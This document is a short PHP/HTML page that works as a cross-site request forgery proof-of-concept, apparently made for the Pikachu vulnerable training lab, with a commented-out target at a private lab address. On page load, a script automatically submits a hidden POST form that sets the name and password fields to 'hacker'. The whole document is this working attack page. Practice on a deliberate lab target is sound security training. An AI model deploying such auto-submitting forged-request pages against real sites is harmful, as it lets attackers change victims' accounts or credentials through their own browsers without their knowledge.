<?php?>
<html>
<head>
<script>
window.onload = function()
{
    document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<!--form method="post" action="http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"-->
<form method="post" action="check_post.php">
<input id="sex" type="text" name="name" value="hacker" />
<input id="add" type="text" name="passwd" value="hacker" />
<input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>

